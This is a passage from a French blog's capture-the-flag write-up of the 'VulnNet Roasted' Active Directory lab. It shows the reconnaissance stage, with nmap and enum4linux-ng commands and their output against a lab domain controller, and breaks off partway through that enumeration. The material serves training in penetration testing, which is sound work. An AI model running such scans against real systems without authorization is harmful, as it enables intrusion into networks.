<!doctype html>
<html class="position-relative" itemscope itemtype="https://schema.org/WebPage" lang="en"
  data-bs-theme="auto" data-palette="purple">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><script src="/assets/init/bundle.min.aeab7f1c076c477ff3f6cdea64bc5397a7cadfb98cb5b10012c17fca3da5f0ad.js" integrity="sha256-rqt/HAdsR3/z9s3qZLxTl6fK37mMtbEAEsF/yj2l8K0=" crossorigin="anonymous"></script>
<meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>VulnNet Roasted - </title>
    <link rel="icon" href="/favicon_hucccd9e706a19cc8586335b155a80c266_43860_16x16_resize_q75_h2_box_2.webp" sizes="16x16" type="image/webp">
    <link rel="icon" href="/favicon_hucccd9e706a19cc8586335b155a80c266_43860_32x32_resize_q75_h2_box_2.webp" sizes="32x32" type="image/webp">
    <link rel="icon" href="/favicon_hucccd9e706a19cc8586335b155a80c266_43860_150x150_resize_q75_h2_box_2.webp" sizes="150x150" type="image/webp">
    <link rel="apple-touch-icon" href="/favicon_hucccd9e706a19cc8586335b155a80c266_43860_180x180_resize_q75_h2_box_2.webp" sizes="180x180" type="image/webp">
    <link rel="icon" href="/favicon_hucccd9e706a19cc8586335b155a80c266_43860_192x192_resize_q75_h2_box_2.webp" sizes="192x192" type="image/webp">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#6f42c1">
<meta name="keywords" content="Hugo, Bootstrap, Blog Theme" />
  <meta name="description" content="



VulnNet Entertainment a rapidement déployé une nouvelle instance de gestion sur leur réseau très étendu…
VulnNet Entertainment vient de déployer une nouvelle instance sur leur réseau avec les administrateurs systèmes récemment embauchés. En tant qu&rsquo;entreprise soucieuse de la sécurité, ils vous ont, comme toujours, engagé pour réaliser un test de pénétration et voir comment les administrateurs systèmes se débrouillent." />
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="VulnNet Roasted">
  <meta name="twitter:description" content=" VulnNet Entertainment a rapidement déployé une nouvelle instance de gestion sur leur réseau très étendu…
VulnNet Entertainment vient de déployer une nouvelle instance sur leur réseau avec les administrateurs systèmes récemment embauchés. En tant qu’entreprise soucieuse de la sécurité, ils vous ont, comme toujours, engagé pour réaliser un test de pénétration et voir comment les administrateurs systèmes se débrouillent.">
<meta property="og:url" content="//localhost:1313/news/2024/03/vulnnet-roasted/">
  <meta property="og:title" content="VulnNet Roasted">
  <meta property="og:description" content=" VulnNet Entertainment a rapidement déployé une nouvelle instance de gestion sur leur réseau très étendu…
VulnNet Entertainment vient de déployer une nouvelle instance sur leur réseau avec les administrateurs systèmes récemment embauchés. En tant qu’entreprise soucieuse de la sécurité, ils vous ont, comme toujours, engagé pour réaliser un test de pénétration et voir comment les administrateurs systèmes se débrouillent.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="news">
    <meta property="article:published_time" content="2024-03-26T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-03-26T00:00:00+00:00">
    <meta property="article:tag" content="Active Directory">
    <meta property="article:tag" content="Kerberos">
    <meta property="article:tag" content="AS-REP Roasting">
      <meta property="og:see_also" content="//localhost:1313/news/2024/08/m5stack-cardputer/">
      <meta property="og:see_also" content="//localhost:1313/news/2024/08/probe-attack/">
      <meta property="og:see_also" content="//localhost:1313/news/2024/04/rubber-ducky-attiny85/">
      <meta property="og:see_also" content="//localhost:1313/news/2024/03/headless/">
      <meta property="og:see_also" content="//localhost:1313/news/2024/03/juice-shop/">

  <meta itemprop="name" content="VulnNet Roasted">
  <meta itemprop="description" content=" VulnNet Entertainment a rapidement déployé une nouvelle instance de gestion sur leur réseau très étendu…
VulnNet Entertainment vient de déployer une nouvelle instance sur leur réseau avec les administrateurs systèmes récemment embauchés. En tant qu’entreprise soucieuse de la sécurité, ils vous ont, comme toujours, engagé pour réaliser un test de pénétration et voir comment les administrateurs systèmes se débrouillent.">
  <meta itemprop="datePublished" content="2024-03-26T00:00:00+00:00">
  <meta itemprop="dateModified" content="2024-03-26T00:00:00+00:00">
  <meta itemprop="wordCount" content="3106">
  <meta itemprop="keywords" content="Active Directory,Kerberos,AS-REP Roasting">
  <meta property="og:image" content="//localhost:1313/images/image.png"/>
  <meta name="twitter:image" content="//localhost:1313/images/image.png"/>
  <meta property="og:image:alt" content="VulnNet Roasted" />
  <meta name="twitter:image:alt" content="VulnNet Roasted" />
  <link rel="manifest" href="/manifest.json">

  


<link data-precache rel="stylesheet" href="/assets/main/bundle.min.dc696d543002e67b655ace129a11660646a70a3eb5d3ccb45225ecfdaec61996.css" integrity="sha256-3GltVDAC5ntlWs4SmhFmBkanCj6108y0UiXs/a7GGZY=" crossorigin="anonymous">

    <link data-precache rel="stylesheet" href="/assets/viewer/bundle.min.81fc6ea2b654c63ccf8e3c859d12072f72f8cbe3f759361479f8b0c00f754e95.css" integrity="sha256-gfxuorZUxjzPjjyFnRIHL3L4y&#43;P3WTYUefiwwA91TpU=" crossorigin="anonymous">


</head>
  <body><header class="mb-4 sticky-top">
  
<nav class="top-app-bar shadow navbar navbar-expand-xxl">
  <div class="container">
<a class="navbar-brand d-flex align-items-center flex-grow-1 flex-xxl-grow-0 justify-content-xxl-start ms-2 ms-xxl-0 mx-auto me-xxl-2"
    href="//localhost:1313/">
    <picture><img class="logo " alt="Logo" src="//localhost:1313/images/image.png?v=8e28e815cea6294f6de693630f6501e6" loading="lazy" width="259" height="194" />
</picture>
Blog de Lukas
</a>

    <div class="offcanvas-xxl offcanvas-end flex-grow-1" data-bs-scroll="true" tabindex="-1" id="navbarMenus" aria-labelledby="navbarMenusLabel">
      <div class="offcanvas-header px-4 pb-0">
        <div class="offcanvas-title h5" id="navbarMenusLabel">Blog de Lukas</div>
        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="offcanvas" data-bs-target="#navbarMenus" aria-label="Close"></button>
      </div>
      <div class="offcanvas-body p-4 pt-0 p-xxl-0">
        <hr class="d-xxl-none">
        <ul class="navbar-nav flex-row flex-wrap align-items-center me-auto"><li class="nav-item col-6 col-xxl-auto">
            <a class="nav-link py-2 px-0 px-xxl-2" href="//localhost:1313/news/">
<span class="menu-icon me-1"><i class="fas fa-fw fa-newspaper"></i></span>News
            </a>
          </li>
          <li class="nav-item col-12 col-xxl-auto dropdown px-0">
            <a href="#"
              class="nav-link dropdown-toggle"
              id="navbarDropdownBlog" role="button" data-bs-toggle="dropdown" aria-expanded="false">
<span class="menu-icon me-1"><i class="fas fa-fw fa-blog"></i></span>Blog
            </a>
            <ul class="dropdown-menu dropdown-menu-end" aria-labelledby="navbarDropdownBlog" data-bs-popper="none">
                <li><h6 class="dropdown-header">Blog Menu Description</h6></li>
              <li>
                <a class="dropdown-item d-flex align-items-center text-wrap text-xxl-nowrap"
                  href="//localhost:1313/archives/">
                    <span class="dropdown-item-icon me-2 p-2 rounded">
                      <i class="fas fa-fw fa-file-archive text-primary"></i>
                    </span>
                  <div class="dropdown-item-content">
                    <p class="dropdown-item-title mb-0">Archives</p>
                  </div></a>
              </li>
              <li>
                <a class="dropdown-item d-flex align-items-center text-wrap text-xxl-nowrap"
                  href="//localhost:1313/series/">
                    <span class="dropdown-item-icon me-2 p-2 rounded">
                      <i class="fas fa-fw fa-columns"></i>
                    </span>
                  <div class="dropdown-item-content">
                    <p class="dropdown-item-title mb-1">Series</p>
                      <p class="dropdown-item-description mb-0 text-secondary">List of series.</p>
                  </div></a>
              </li>
              <li>
                <a class="dropdown-item d-flex align-items-center text-wrap text-xxl-nowrap"
                  href="//localhost:1313/categories/">
                    <span class="dropdown-item-icon me-2 p-2 rounded">
                      <i class="fas fa-fw fa-folder text-success"></i>
                    </span>
                  <div class="dropdown-item-content">
                    <p class="dropdown-item-title mb-1">Categories</p>
                      <p class="dropdown-item-description mb-0 text-secondary">List of categories.</p>
                  </div></a>
              </li>
              <li>
                <a class="dropdown-item d-flex align-items-center text-wrap text-xxl-nowrap"
                  href="//localhost:1313/tags/">
                    <span class="dropdown-item-icon me-2 p-2 rounded">
                      <i class="fas fa-fw fa-tags"></i>
                    </span>
                  <div class="dropdown-item-content">
                    <p class="dropdown-item-title mb-1">Tags</p>
                      <p class="dropdown-item-description mb-0 text-secondary">List of tags.</p>
                  </div></a>
              </li>
            </ul>
          </li>
        </ul>
        
    <hr class="d-xxl-none">
    <form class="search-bar ms-auto my-auto" action="/search/" novalidate>
      <div class="input-group align-items-center">
        <span class="btn btn-search disabled position-absolute left-0 border-0 px-1">
          <i class="fas fa-fw fa-search fa-lg"></i>
        </span>
        <input
          class="my-1 form-control border-white rounded-5 search-input bg-body"
          name="q"
          type="search"
          placeholder="Search"
          aria-label="Search"
          required>
          <span class="search-shortcut position-absolute end-0 top-0 me-2">
            <kbd class="text-dark bg-white opacity-75 rounded-3 shadow border border-primary py-1 fw-bold">/</kbd>
          </span>
      </div>
    </form><hr class="d-xxl-none">
        <ul class="navbar-nav flex-row flex-wrap align-items-center ms-md-auto">
<li class="nav-item py-2 py-xxl-1 col-12 col-xxl-auto">


<nav class="social-links nav justify-content-center flex-row">
      <a class="nav-link social-link col-6 col-xxl-auto p-1" target="_blank" href="https://github.com/ticodevv" title="GitHub" rel="me">
        <i class="fa-fw fab fa-github"
          ></i>
        <span class="ms-1 d-xxl-none">Github</span>
      </a>
  <a class="nav-link social-link col-6 col-xxl-auto p-1" target="_blank" href="/index.xml" title="RSS" rel="me">
    <i class="fas fa-fw fa-rss"></i>
    <span class="ms-1 d-xxl-none">RSS</span>
  </a>
</nav>

</li>
<li class="nav-item py-2 py-xxl-1 col-12 col-xxl-auto">
  <div class="vr d-none d-xxl-flex h-100 mx-xxl-2 text-white"></div>
  <hr class="d-xxl-none my-2">
</li>
<li class="nav-item dropdown col-6 col-xxl-auto">
    <a class="nav-link px-0 py-2 px-xxl-1" href="#" id="fontSizeDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
        <i class="fas fa-fw fa-font"></i>
        <span class="d-xxl-none">Font Size</span>
    </a>
    <ul class="font-size-dropdown-menu dropdown-menu dropdown-menu-end" aria-labelledby="fontSizeDropdown">
        <li>
            <button class="font-size-item dropdown-item" data-size="xs">
                Extra Small
            </button>
        </li>
        <li>
            <button class="font-size-item dropdown-item" data-size="sm">
                Small
            </button>
        </li>
        <li>
            <button class="font-size-item dropdown-item active" data-size="md">
                Medium
            </button>
        </li>
        <li>
            <button class="font-size-item dropdown-item" data-size="lg">
                Large
            </button>
        </li>
        <li>
            <button class="font-size-item dropdown-item" data-size="xl">
                Extra Large
            </button>
        </li>
    </ul>
</li>
<li class="nav-item dropdown col-6 col-xxl-auto">
    <a class="nav-link px-0 py-2 px-xxl-1" href="#" id="paletteDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
        <i class="fas fa-fw fa-palette"></i>
        <span class="d-xxl-none">Palette</span>
    </a>
    <ul class="palette-dropdown-menu dropdown-menu dropdown-menu-end px-2 row g-2" aria-labelledby="paletteDropdown">
            <li class="col-4 my-1">
                <a role="button" id="palette-blue" aria-label="Blue"
                    class="btn btn-sm w-100 palette text-bg-blue" data-palette="blue">
                </a>
            </li>
            <li class="col-4 my-1">
                <a role="button" id="palette-blue-gray" aria-label="Blue Gray"
                    class="btn btn-sm w-100 palette text-bg-blue-gray" data-palette="blue-gray">
                </a>
            </li>
            <li class="col-4 my-1">
                <a role="button" id="palette-brown" aria-label="Brown"
                    class="btn btn-sm w-100 palette text-bg-brown" data-palette="brown">
                </a>
            </li>
            <li class="col-4 my-1">
                <a role="button" id="palette-cyan" aria-label="Cyan"
                    class="btn btn-sm w-100 palette text-bg-cyan" data-palette="cyan">
                </a>
            </li>
            <li class="col-4 my-1">
                <a role="button" id="palette-green" aria-label="Green"
                    class="btn btn-sm w-100 palette text-bg-green" data-palette="green">
                </a>
            </li>
            <li class="col-4 my-1">
                <a role="button" id="palette-indigo" aria-label="Indigo"
                    class="btn btn-sm w-100 palette text-bg-indigo" data-palette="indigo">
                </a>
            </li>
            <li class="col-4 my-1">
                <a role="button" id="palette-orange" aria-label="Orange"
                    class="btn btn-sm w-100 palette text-bg-orange" data-palette="orange">
                </a>
            </li>
            <li class="col-4 my-1">
                <a role="button" id="palette-pink" aria-label="Pink"
                    class="btn btn-sm w-100 palette text-bg-pink" data-palette="pink">
                </a>
            </li>
            <li class="col-4 my-1">
                <a role="button" id="palette-purple" aria-label="Purple"
                    class="btn btn-sm w-100 palette text-bg-purple" data-palette="purple">
                </a>
            </li>
            <li class="col-4 my-1">
                <a role="button" id="palette-red" aria-label="Red"
                    class="btn btn-sm w-100 palette text-bg-red" data-palette="red">
                </a>
            </li>
            <li class="col-4 my-1">
                <a role="button" id="palette-teal" aria-label="Teal"
                    class="btn btn-sm w-100 palette text-bg-teal" data-palette="teal">
                </a>
            </li>
            <li class="col-4 my-1">
                <a role="button" id="palette-yellow" aria-label="Yellow"
                    class="btn btn-sm w-100 palette text-bg-yellow" data-palette="yellow">
                </a>
            </li>
    </ul>
</li>
<li class="nav-item dropdown col-6 col-xxl-auto">
    <a class="nav-link px-0 py-2 px-xxl-1" href="#" id="modeDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
        <i class="mode-icon fas fa-fw fa-adjust" id="modeIcon"></i>
        <span class="d-xxl-none">Mode</span>
    </a>
    <ul class="mode-dropdown-menu dropdown-menu dropdown-menu-end" aria-labelledby="modeDropdown">
        <li class="mode-item" data-color-mode="light" data-icon="sun">
            <button class="dropdown-item">
                <i class="mode-icon fas fa-fw fa-sun"></i> Light
            </button>
        </li>
        <li class="mode-item" data-color-mode="dark" data-icon="moon">
            <button class="dropdown-item">
                <i class="mode-icon fas fa-fw fa-moon"></i> Dark
            </button>
        </li>
        <li class="mode-item active" data-color-mode="auto" data-icon="adjust">
            <button class="dropdown-item">
                <i class="mode-icon fas fa-fw fa-adjust"></i> Auto
            </button>
        </li>
    </ul>
</li>
        </ul>
      </div>
    </div>
    <div class="d-flex">
      <button class="navbar-toggler order-5 border-0" type="button" data-bs-toggle="offcanvas" data-bs-target="#navbarMenus"
        aria-controls="navbarMenus" aria-expanded="false" aria-label="Toggle navigation">
        <i class="fas fa-ellipsis-h"></i>
      </button>
    </div>
  </div>
</nav>

</header>

    <main class="container has-sidebar" data-kind="page"><script data-precache src="/js/main-init.67a549940762c9a1d4ad27ee5bfca1519d8254280646d99b318c71f791c45bc0.js" integrity="sha256-Z6VJlAdiyaHUrSfuW/yhUZ2CVCgGRtmbMYxx95HEW8A=" crossorigin="anonymous"></script>

      <div class="row content"><noscript>
    <div class="alert alert-danger" role="alert">Your browser does not support JavaScript.</div>
</noscript>

<div class="content-posts col-xxl-8">
  <div class="container"><nav class="row card component" aria-label="breadcrumb">
  <div class="card-body pb-0">
    <ol class="hbs-breadcrumb breadcrumb flex-nowrap"><li class="breadcrumb-item text-surface"><a href="/">Home</a></li><li class="breadcrumb-item text-surface"><a href="/news/">News</a></li><li class="breadcrumb-item active">VulnNet Roasted</li></ol>
  </div>
</nav><div class="post-panel-wrapper position-relative d-flex justify-content-center">
  <div class="d-flex flex-row justify-content-center rounded-5 border post-panel position-fixed px-3 py-1 surface shadow-1">
    
    

    <a class="action btn-reward" role="button" data-bs-toggle="modal" data-bs-target="#rewardModal" title="Buy me a coffee">
  <i class="fas fa-fw fa-coffee"></i>
</a>
    
    
  <a class="action action-toc d-none d-xxl-block" href="#postTOC" role="button" title="Contents">
    <i class="fas fa-fw fa-list-alt"></i>
  </a>
<a class="action action-toc d-block d-xxl-none" href="#post-toc-container" role="button" title="Contents">
  <i class="fas fa-fw fa-list-alt"></i>
</a>
    <a class="action action-copyright" href="#post-copyright" role="button" aria-label="Copyright" title="Copyright">
  <i class="fas fa-fw fa-copyright"></i>
</a>
    <a class="action action-post-comments" href="#post-comments" role="button" aria-label="Comments" title="Comments">
  <i class="fas fa-fw fa-comments"></i>
</a>
    
<a id="sidebarToggler" class="action action-sidebar-toggler d-none d-xxl-block" role="button" title="Toggle sidebar">
  <i class="fas fa-fw fa-expand-alt" data-fa-transform="rotate-45"></i>
</a>

    
  </div>
</div><article class="row card component mb-4 post">
  <div class="card-header ">
    <h1 class="card-title post-title my-2">VulnNet Roasted</h1>
  </div>
  <div class="card-body"><div class="post-meta mb-3">
  <span class="post-date me-1 mb-1" title="created on 2024-03-26 01:00:00 &#43;0100 CET.">March 26, 2024</span><span class="post-reading-time me-1 mb-1">15 min read</span><a href="/authors/lukas/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-author">
      <i class="fas fa-fw fa-user me-1"></i>Lukas</a><a href="/categories/writeups/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-category">
      <i class="fas fa-fw fa-folder me-1"></i>Writeups</a><a href="/series/news/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-series">
      <i class="fas fa-fw fa-columns me-1"></i>News</a><a href="/tags/active-directory/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">Active Directory</a><a href="/tags/as-rep-roasting/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">AS-REP Roasting</a><a href="/tags/kerberos/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">Kerberos</a>
</div>

<div class="mt-2 mb-3 d-block d-xxl-none">
    <h2 class="text-surface mb-3">Contents</h2>
    <div id="post-toc-container">
        </div>
    <hr class="text-secondary">
</div><div class="post-content mb-3" data-bs-spy="scroll" data-bs-target="#TableOfContents" tabindex="0">
        <div id="post-content-body"><p><picture><img class="img-fluid " alt="VulnNet Roasted" src="/news/2024/03/vulnnet-roasted/img.png" loading="lazy" width="512" height="512" />
</picture>

</p>
<p><strong>VulnNet Entertainment</strong> a rapidement déployé une nouvelle instance de gestion sur leur réseau très étendu…</p>
<p>VulnNet Entertainment vient de déployer une nouvelle instance sur leur réseau avec les administrateurs systèmes récemment embauchés. En tant qu&rsquo;entreprise soucieuse de la sécurité, ils vous ont, comme toujours, engagé pour réaliser un test de pénétration et voir comment les administrateurs systèmes se débrouillent.</p>
<h2 id="vulnnet-roasted" data-numberify>VulnNet Roasted<a class="anchor ms-1" href="#vulnnet-roasted"></a></h2>

<h3 id="reconnaissance" data-numberify>Reconnaissance<a class="anchor ms-1" href="#reconnaissance"></a></h3>

<h4 id="nmap" data-numberify>Nmap<a class="anchor ms-1" href="#nmap"></a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">[</span>May 12, <span class="m">2024</span> - 11:38:12 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c1"># nmap -A 10.10.211.33</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-12 11:38 UTC
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">Nmap scan report <span class="k">for</span> 10.10.211.33
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">Host is up <span class="o">(</span>0.096s latency<span class="o">)</span>.
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">Not shown: <span class="m">990</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">PORT     STATE    SERVICE          VERSION
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">88/tcp   filtered kerberos-sec
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">135/tcp  filtered msrpc
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">139/tcp  filtered netbios-ssn
</span></span><span class="line"><span class="ln">10</span><span class="cl">389/tcp  filtered ldap
</span></span><span class="line"><span class="ln">11</span><span class="cl">464/tcp  filtered kpasswd5
</span></span><span class="line"><span class="ln">12</span><span class="cl">593/tcp  filtered http-rpc-epmap
</span></span><span class="line"><span class="ln">13</span><span class="cl">636/tcp  filtered ldapssl
</span></span><span class="line"><span class="ln">14</span><span class="cl">3268/tcp filtered globalcatLDAP
</span></span><span class="line"><span class="ln">15</span><span class="cl">3269/tcp filtered globalcatLDAPssl
</span></span><span class="line"><span class="ln">16</span><span class="cl">3389/tcp filtered ms-wbt-server
</span></span><span class="line"><span class="ln">17</span><span class="cl">Too many fingerprints match this host to give specific OS details
</span></span><span class="line"><span class="ln">18</span><span class="cl">Network Distance: <span class="m">2</span> hops
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl">TRACEROUTE <span class="o">(</span>using port 80/tcp<span class="o">)</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">HOP RTT      ADDRESS
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="m">1</span>   62.48 ms 10.8.0.1
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="m">2</span>   79.22 ms 10.10.211.33
</span></span></code></pre></div>
<h4 id="ports-ouverts" data-numberify>Ports ouverts:<a class="anchor ms-1" href="#ports-ouverts"></a></h4>
<ul>
<li><strong>88/tcp:</strong> Kerberos</li>
<li><strong>135/tcp:</strong> MSRPC (Microsoft Windows RPC)</li>
<li><strong>139/tcp:</strong> NetBIOS (Microsoft Windows netbios-ssn)</li>
<li><strong>389/tcp:</strong> LDAP (Lightweight Directory Access Protocol)</li>
<li><strong>464/tcp:</strong> Kpasswd5</li>
<li><strong>593/tcp:</strong> HTTP-RPC-EPMAP</li>
<li><strong>636/tcp:</strong> LDAPSSL</li>
<li><strong>3268/tcp:</strong> GlobalcatLDAP</li>
<li><strong>3269/tcp:</strong> GlobalcatLDAPssl</li>
<li><strong>3389/tcp:</strong> MS-WBT-SERVER (Microsoft Windows Remote Desktop)</li>
</ul>

<h4 id="enum4linux" data-numberify>enum4linux<a class="anchor ms-1" href="#enum4linux"></a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">[</span>May 12, <span class="m">2024</span> - 11:41:25 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c1"># enum4linux-ng -A 10.10.211.33</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">ENUM4LINUX - next generation <span class="o">(</span>v1.3.3<span class="o">)</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"> <span class="o">==========================</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="p">|</span>    Target Information    <span class="p">|</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"> <span class="o">==========================</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Target ........... 10.10.211.33
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Username ......... <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Random Username .. <span class="s1">&#39;qadhxoqj&#39;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Password ......... <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Timeout .......... <span class="m">5</span> second<span class="o">(</span>s<span class="o">)</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"> <span class="o">=====================================</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="p">|</span>    Listener Scan on 10.10.211.33    <span class="p">|</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"> <span class="o">=====================================</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Checking LDAP
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="o">[</span>+<span class="o">]</span> LDAP is accessible on 389/tcp
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Checking LDAPS
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="o">[</span>+<span class="o">]</span> LDAPS is accessible on 636/tcp
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Checking SMB
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="o">[</span>+<span class="o">]</span> SMB is accessible on 445/tcp
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Checking SMB over NetBIOS
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="o">[</span>+<span class="o">]</span> SMB over NetBIOS is accessible on 139/tcp
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl"> <span class="o">====================================================</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">|</span>    Domain Information via LDAP <span class="k">for</span> 10.10.211.33    <span class="p">|</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl"> <span class="o">====================================================</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying LDAP
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="o">[</span>+<span class="o">]</span> Appears to be root/parent DC
</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="o">[</span>+<span class="o">]</span> Long domain name is: vulnnet-rst.local
</span></span><span class="line"><span class="ln">31</span><span class="cl">
</span></span><span class="line"><span class="ln">32</span><span class="cl"> <span class="o">===========================================================</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="p">|</span>    NetBIOS Names and Workgroup/Domain <span class="k">for</span> 10.10.211.33    <span class="p">|</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl"> <span class="o">===========================================================</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="o">[</span>-<span class="o">]</span> Could not get NetBIOS names information via <span class="s1">&#39;nmblookup&#39;</span>: timed <span class="nv">out</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">
</span></span><span class="line"><span class="ln">37</span><span class="cl"> <span class="o">=========================================</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="p">|</span>    SMB Dialect Check on 10.10.211.33    <span class="p">|</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl"> <span class="o">=========================================</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying on 445/tcp
</span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="o">[</span>+<span class="o">]</span> Supported dialects and settings:
</span></span><span class="line"><span class="ln">42</span><span class="cl">Supported dialects:
</span></span><span class="line"><span class="ln">43</span><span class="cl">  SMB 1.0: <span class="nb">false</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">  SMB 2.02: <span class="nb">true</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">  SMB 2.1: <span class="nb">true</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">  SMB 3.0: <span class="nb">true</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">  SMB 3.1.1: <span class="nb">true</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">Preferred dialect: SMB 3.0
</span></span><span class="line"><span class="ln">49</span><span class="cl">SMB1 only: <span class="nb">false</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl">SMB signing required: <span class="nb">true</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">
</span></span><span class="line"><span class="ln">52</span><span class="cl"> <span class="o">===========================================================</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl"><span class="p">|</span>    Domain Information via SMB session <span class="k">for</span> 10.10.211.33    <span class="p">|</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl"> <span class="o">===========================================================</span>
</span></span><span class="line"><span class="ln">55</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Enumerating via unauthenticated SMB session on 445/tcp
</span></span><span class="line"><span class="ln">56</span><span class="cl"><span class="o">[</span>+<span class="o">]</span> Found domain information via SMB
</span></span><span class="line"><span class="ln">57</span><span class="cl">NetBIOS computer name: WIN-2BO8M1OE1M1
</span></span><span class="line"><span class="ln">58</span><span class="cl">NetBIOS domain name: VULNNET-RST
</span></span><span class="line"><span class="ln">59</span><span class="cl">DNS domain: vulnnet-rst.local
</span></span><span class="line"><span class="ln">60</span><span class="cl">FQDN: WIN-2BO8M1OE1M1.vulnnet-rst.local
</span></span><span class="line"><span class="ln">61</span><span class="cl">Derived membership: domain member
</span></span><span class="line"><span class="ln">62</span><span class="cl">Derived domain: VULNNET-RST
</span></span><span class="line"><span class="ln">63</span><span class="cl">
</span></span><span class="line"><span class="ln">64</span><span class="cl"> <span class="o">=========================================</span>
</span></span><span class="line"><span class="ln">65</span><span class="cl"><span class="p">|</span>    RPC Session Check on 10.10.211.33    <span class="p">|</span>
</span></span><span class="line"><span class="ln">66</span><span class="cl"> <span class="o">=========================================</span>
</span></span><span class="line"><span class="ln">67</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Check <span class="k">for</span> null session
</span></span><span class="line"><span class="ln">68</span><span class="cl"><span class="o">[</span>-<span class="o">]</span> Could not establish null session: timed out
</span></span><span class="line"><span class="ln">69</span><span class="cl"><span class="o">[</span>*<span class="o">]</span> Check <span class="k">for</span> random user
